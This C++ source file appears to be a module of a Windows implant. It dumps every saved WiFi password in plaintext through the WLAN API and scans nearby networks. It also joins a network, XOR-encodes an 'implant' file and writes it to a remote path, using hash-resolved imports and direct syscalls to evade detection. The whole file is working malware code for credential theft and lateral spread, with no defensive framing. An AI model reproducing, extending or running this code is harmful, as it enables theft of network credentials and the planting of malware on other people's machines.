#include "WifiDumper.h"
#include "../utils/Exec.h"
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <iomanip>
#include <regex>
#include <chrono>
#include <thread>
#include <winternl.h>
#include "../fs/FileSystem.h"
#include "../utils/Shared.h"
#include "../evasion/Syscalls.h"

#pragma comment(lib, "wlanapi.lib")

extern "C" void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);

namespace wifi {

    namespace {
        std::string getTagValue(const std::string& content, const std::string& tag) {
            // Simple robust regex for extracting tag content: <tag>value</tag>
            std::regex re("<([a-zA-Z0-9_]+:)?" + tag + ">(.*?)</([a-zA-Z0-9_]+:)?" + tag + ">");
            std::smatch match;
            if (std::regex_search(content, match, re)) {
                return match[2].str();
            }
            return "";
        }
    }

    std::string dumpWifiProfiles() {
        HANDLE hClient = NULL;
        DWORD dwMaxClient = 2;
        DWORD dwCurVersion = 0;
        DWORD dwResult = 0;
        std::string report = "WIFI_PASSWORDS_DUMPED (Native API):\n";
        report += "SSID                                     PASSWORD                       AUTH\n";
        report += "----------------------------------------------------------------------------------------------------\n";

        dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        if (dwResult != ERROR_SUCCESS) {
            return "WIFI_DUMP_ERROR: Failed to open Wlan handle (Code: " + std::to_string(dwResult) + ")";
        }

        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
        if (dwResult != ERROR_SUCCESS) {
            WlanCloseHandle(hClient, NULL);
            return "WIFI_DUMP_ERROR: Failed to enum interfaces.";
        }

        int count = 0;
        for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
            WLAN_INTERFACE_INFO IfInfo = pIfList->InterfaceInfo[i];
            PWLAN_PROFILE_INFO_LIST pProfileList = NULL;

            dwResult = WlanGetProfileList(hClient, &IfInfo.InterfaceGuid, NULL, &pProfileList);
            if (dwResult != ERROR_SUCCESS) continue;

            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                WLAN_PROFILE_INFO ProfileInfo = pProfileList->ProfileInfo[j];
                LPWSTR pProfileXml = NULL;
                DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD dwGrantedAccess = 0;

                dwResult = WlanGetProfile(hClient, &IfInfo.InterfaceGuid, ProfileInfo.strProfileName, NULL, &pProfileXml, &dwFlags, &dwGrantedAccess);
                if (dwResult == ERROR_SUCCESS) {
                    // Convert WCHAR* to std::string
                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, pProfileXml, -1, NULL, 0, NULL, NULL);
                    std::string xml(size_needed, 0);
                    WideCharToMultiByte(CP_UTF8, 0, pProfileXml, -1, &xml[0], size_needed, NULL, NULL);

                    std::string ssid = getTagValue(xml, "name");
                    std::string auth = getTagValue(xml, "authentication");
                    std::string key = getTagValue(xml, "keyMaterial");
                    
                    if (key.empty()) key = "[OPEN/NO PASSWORD]";

                    std::stringstream line;
                    line << std::left << std::setw(40) << ssid.substr(0, 39)
                         << std::setw(30) << key.substr(0, 29)
                         << auth << "\n";
                    report += line.str();
                    count++;

                    WlanFreeMemory(pProfileXml);
                }
            }
            if (pProfileList) WlanFreeMemory(pProfileList);
        }

        if (pIfList) WlanFreeMemory(pIfList);
        WlanCloseHandle(hClient, NULL);

        if (count == 0) return "No saved WiFi profiles found.";
        
        report += "\n\nTotal networks: " + std::to_string(count);
        return report;
    }

    std::string scanAvailableWifi() {
        std::string output = utils::RunCommand("netsh wlan show networks mode=Bssid");
        if (output.empty()) return "WIFI_SCAN_ERROR: Failed to run netsh.";

        std::stringstream ss(output);
        std::string line;
        std::string report = "WIFI_SCAN_RESULTS:\n";
        report += "SSID                                     SIGNAL    AUTH            ENCRYPTION\n";
        report += "----------------------------------------------------------------------------------------------------\n";

        struct Network {
            std::string ssid;
            std::string signal;
            std::string auth;
            std::string enc;
        } current;

        std::vector<Network> networks;
        while (std::getline(ss, line)) {
            if (line.find("SSID") != std::string::npos && line.find(":") != std::string::npos) {
                 if (!current.ssid.empty()) {
                     networks.push_back(current);
                     current = Network();
                 }
                 size_t col = line.find(":");
                 current.ssid = line.substr(col + 1);
                 current.ssid.erase(0, current.ssid.find_first_not_of(" \t\r\n"));
                 current.ssid.erase(current.ssid.find_last_not_of(" \t\r\n") + 1);
                 if (current.ssid.empty()) current.ssid = "[Hidden SSID]";
            }
            if (line.find("Signal") != std::string::npos) {
                 size_t col = line.find(":");
                 current.signal = line.substr(col + 1);
                 current.signal.erase(0, current.signal.find_first_not_of(" \t\r\n"));
                 current.signal.erase(current.signal.find_last_not_of(" \t\r\n") + 1);
            }
             if (line.find("Authentication") != std::string::npos) {
                 size_t col = line.find(":");
                 current.auth = line.substr(col + 1);
                 current.auth.erase(0, current.auth.find_first_not_of(" \t\r\n"));
                 current.auth.erase(current.auth.find_last_not_of(" \t\r\n") + 1);
            }
             if (line.find("Encryption") != std::string::npos) {
                 size_t col = line.find(":");
                 current.enc = line.substr(col + 1);
                 current.enc.erase(0, current.enc.find_first_not_of(" \t\r\n"));
                 current.enc.erase(current.enc.find_last_not_of(" \t\r\n") + 1);
            }
        }
        if (!current.ssid.empty()) networks.push_back(current);

        size_t limit = std::min(networks.size(), (size_t)30);
        for (size_t i = 0; i < limit; ++i) {
             std::stringstream row;
             row << std::left << std::setw(40) << networks[i].ssid.substr(0, 39)
                 << std::setw(10) << networks[i].signal
                 << std::setw(15) << networks[i].auth
                 << networks[i].enc << "\n";
             report += row.str();
        }

        report += "\n\nNetworks detected: " + std::to_string(networks.size());
        return report;
    }

    bool ConnectAndShareImplant(const std::string& ssid, const std::string& password, const std::string& implantPath, const std::string& remotePath) {
        // Dynamic resolve to avoid import
        typedef DWORD (WINAPI *pWlanConnect)(HANDLE, const GUID*, const WLAN_CONNECTION_PARAMETERS*, PVOID);
        HMODULE hWlan = LoadLibraryA("wlanapi.dll");
        pWlanConnect pConnect = (pWlanConnect)utils::getProcByHash(hWlan, utils::djb2Hash("WlanConnect"));
        if (!pConnect) return false;

        HANDLE hClient = NULL;
        WlanOpenHandle(2, NULL, NULL, &hClient);
        DWORD dwResult = 0;
        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        WlanEnumInterfaces(hClient, NULL, &pIfList);
        if (pIfList->dwNumberOfItems > 0) {
            GUID ifGuid = pIfList->InterfaceInfo[0].InterfaceGuid;
            DOT11_SSID dot11Ssid = { (ULONG)ssid.length(), {} };
            memcpy(dot11Ssid.ucSSID, ssid.c_str(), ssid.length());

            if (!password.empty()) {
                std::wstring wProfileXml = L"<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>" + std::wstring(ssid.begin(), ssid.end()) + L"</name><SSIDConfig><SSID><name>" + std::wstring(ssid.begin(), ssid.end()) + L"</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>" + std::wstring(password.begin(), password.end()) + L"</keyMaterial></sharedKey></security></MSM></WLANProfile>";
                DWORD dwReason = 0;
                WlanSetProfile(hClient, &ifGuid, 0, wProfileXml.c_str(), NULL, TRUE, NULL, &dwReason);
            }

            WLAN_CONNECTION_PARAMETERS connParams = { wlan_connection_mode_profile, std::wstring(ssid.begin(), ssid.end()).c_str(), &dot11Ssid, NULL, NULL, NULL, 0 };
            dwResult = pConnect(hClient, &ifGuid, &connParams, NULL);
            if (dwResult == ERROR_SUCCESS) {
                for (int i = 0; i < 10; ++i) {
                    PWLAN_CONNECTION_ATTRIBUTES pConnAttrib = NULL;
                    if (WlanQueryInterface(hClient, &ifGuid, wlan_intf_opcode_current_connection, NULL, NULL, (PVOID*)&pConnAttrib, NULL) == ERROR_SUCCESS) {
                        if (pConnAttrib->isState == wlan_interface_state_connected) {
                            WlanFreeMemory(pConnAttrib);
                            break;
                        }
                        WlanFreeMemory(pConnAttrib);
                    }
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }

                auto implantData = fs::ReadFileBinary(implantPath);
                BYTE key = (BYTE)(GetTickCount() & 0xFF);
                for (auto& b : implantData) b ^= key;

                evasion::SyscallResolver& resolver = evasion::SyscallResolver::GetInstance();
                DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
                DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
                DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

                std::wstring wRemotePath(remotePath.begin(), remotePath.end());
                UNICODE_STRING uniRemotePath;
                RtlInitUnicodeString(&uniRemotePath, wRemotePath.c_str());

                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, &uniRemotePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

                HANDLE hFile;
                IO_STATUS_BLOCK ioStatusBlock;
                NTSTATUS status = InternalDoSyscall(ntCreateFileSsn, &hFile, FILE_GENERIC_WRITE, &objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

                if (NT_SUCCESS(status)) {
                    InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatusBlock, implantData.data(), (ULONG)implantData.size(), NULL, NULL);
                    InternalDoSyscall(ntCloseSsn, hFile);
                    return true;
                }
                return false;
            }
        }
        WlanFreeMemory(pIfList);
        WlanCloseHandle(hClient, NULL);
        FreeLibrary(hWlan);
        return false;
    }
}
